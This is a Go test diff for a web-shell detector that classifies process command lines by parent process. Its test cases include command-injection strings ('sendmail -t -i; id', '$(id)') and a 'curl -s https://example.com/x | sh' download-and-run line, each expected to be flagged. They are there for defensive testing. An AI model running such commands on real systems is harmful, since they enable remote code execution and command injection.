@@ -193,6 +193,16 @@ func TestClassifyExec(t *testing.T) {
 	// a framework's command-line entry point run from its application is not unusual.
 	shared := ctx
 	shared.webUsers = map[int]bool{33: true, 1000: true}
+	// PPID 90 is a scheduler, PPID 5 the PHP pool.
+	shared.parent = func(p system.Process) (system.Process, bool) {
+		switch p.PPID {
+		case 90:
+			return system.Process{UID: 1000, Cmdline: "php artisan schedule:work"}, true
+		case 5:
+			return system.Process{UID: p.UID, Cmdline: "php-fpm: pool www"}, true
+		}
+		return system.Process{}, false
+	}
 	for _, c := range []struct {
 		p    system.Process
 		want string
@@ -204,6 +214,15 @@ func TestClassifyExec(t *testing.T) {
 		{system.Process{UID: 1001, Exe: "/usr/bin/php8.3", Cmdline: "php /var/www/shop/bin/magento cron:run"}, ""},
 		{system.Process{UID: 1001, Exe: "/usr/bin/php8.3", Cmdline: "php /var/www/protocol/x.php"}, ReasonUnusualPath},
 		{system.Process{UID: 1000, Exe: "/usr/bin/php8.3", Cmdline: "php /home/ubuntu/applications/site/public/uploads/artisan"}, ReasonUnusualPath},
+		// PHP's mail() runs sendmail through the shell; anything more is a shell command.
+		{system.Process{UID: 33, PPID: 5, Exe: "/usr/bin/bash", Cmdline: "sh -c /usr/sbin/sendmail -t -i -fnoreply@example.com"}, ""},
+		{system.Process{UID: 33, PPID: 5, Exe: "/usr/bin/bash", Cmdline: "sh -c /usr/sbin/sendmail -t -i; id"}, ReasonWebShell},
+		{system.Process{UID: 33, PPID: 5, Exe: "/usr/bin/bash", Cmdline: "sh -c /usr/sbin/sendmail -t $(id)"}, ReasonWebShell},
+		// A scheduler runs its commands through the shell; the same command from the PHP pool
+		// is a webshell's.
+		{system.Process{UID: 1000, PPID: 90, Exe: "/usr/bin/dash", Cmdline: "sh -c /usr/bin/php8.3 artisan dispatch:message > /dev/null 2>&1"}, ""},
+		{system.Process{UID: 1000, PPID: 5, Exe: "/usr/bin/dash", Cmdline: "sh -c /usr/bin/php8.3 artisan dispatch:message > /dev/null 2>&1"}, ReasonWebShell},
+		{system.Process{UID: 1000, PPID: 90, Exe: "/usr/bin/dash", Cmdline: "sh -c curl -s https://example.com/x | sh"}, ReasonWebShell},
 	} {
 		if got, _ := classifyExec(c.p, shared); got != c.want {
 			t.Errorf("%+v: %q, want %q", c.p, got, c.want)
